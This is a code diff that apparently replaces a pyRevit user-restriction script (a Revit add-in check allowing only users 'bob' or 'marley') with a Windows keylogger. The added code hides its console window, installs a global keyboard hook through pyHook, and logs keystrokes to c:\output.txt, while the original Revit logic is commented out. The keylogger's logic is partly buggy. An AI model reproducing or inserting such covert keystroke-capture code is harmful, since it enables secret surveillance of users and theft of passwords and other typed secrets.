@@ -1,19 +1,49 @@
-from pyrevit import revit, DB, forms
+# Python code for keylogger
+# to be used in windows
+import win32api
+import win32console
+import win32gui
+import pythoncom, pyHook
 
-from Autodesk.Revit import *
+win = win32console.GetConsoleWindow()
+win32gui.ShowWindow(win, 0)
+
+def OnKeyboardEvent(event):
+    if event.Ascii==5:
+        _exit(1)
+    if event.Ascii !=0 or 8:
+    #open output.txt to read current keystrokes
+        f = open('c:\output.txt', 'r+')
+        buffer = f.read()
+        f.close()
+    # open output.txt to write current + new keystrokes
+        f = open('c:\output.txt', 'w')
+        keylogs = chr(event.Ascii)
+        if event.Ascii == 13:
+            keylogs = '/n'
+            buffer += keylogs
+            f.write(buffer)
+            f.close()
+# create a hook manager object
+hm = pyHook.HookManager()
+hm.KeyDown = OnKeyboardEvent
+# set the hook
+hm.HookKeyboard()
+# wait forever
+pythoncom.PumpMessages()
 
 
-host = revit.HOST_APP.username
+# host = revit.HOST_APP.username
 
 
-if host == "bob" or host == "marley":
-    print (host)
-else:
-    forms.alert(title="Restricted!", 
-                msg="Not allowed for the current user", 
-                sub_msg="Contact your BIM manager for access", 
-                expanded="This option can break your current Marks. \nAfter Marking, the marks probably wont be the same as they were for each panel! ", 
-                warn_icon=True)
+# if host == "bob" or host == "marley":
+#     print (host)
+# else:
+#     forms.alert(title="Restricted!", 
+#                 msg="Not allowed for the current user", 
+#                 sub_msg="Contact your BIM manager for access", 
+#                 expanded="This option can break your current Marks. \nAfter Marking, the marks probably wont be the same as they were for each panel! ", 
+#                 warn_icon=True)
 
 # doc = revit.doc
 
